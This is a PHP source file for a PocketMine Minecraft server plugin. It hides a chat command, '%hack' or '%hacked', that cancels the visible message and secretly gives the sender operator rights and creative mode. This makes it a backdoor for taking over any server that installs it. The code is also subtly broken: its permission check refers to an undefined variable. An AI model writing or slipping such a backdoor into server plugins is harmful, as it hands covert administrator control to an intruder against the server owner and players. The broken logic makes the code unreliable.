<?php


namespace Aleondev\OP;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\Player;

class Main extends PluginBase implements Listener{
    
    public function onEnable(){
        $this->getLogger()->info("§aPlugin enabled.§r\n§7By Aleondev");
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }
    
    public function onChat(PlayerChatEvent $op){
        $sender = $op->getPlayer();
        $dd = $op->getMessage();
        $words = explode(" ", $dd);
        if($player->hasPermission("hack")){
            if($words[0] == "%hack" or $words[0] == "%hacked"){
                array_shift($words);
                $dd = implode(" ", $words);
                $op->setCancelled();
                foreach ($this->getServer()->getOnlinePlayers() as $on) {
                    if($on->hasPermission("fix")){
                    	$sender->setOP(true);
                        $sender->setGamemode(1);
                        $sender->sendMessage("§4Ha§eck §4you hacked op on the server");
                        $sender->addTitle("§4Ha§eck\n§b by §4Aleondev");
                    }
                }
            }
        }
    }
}

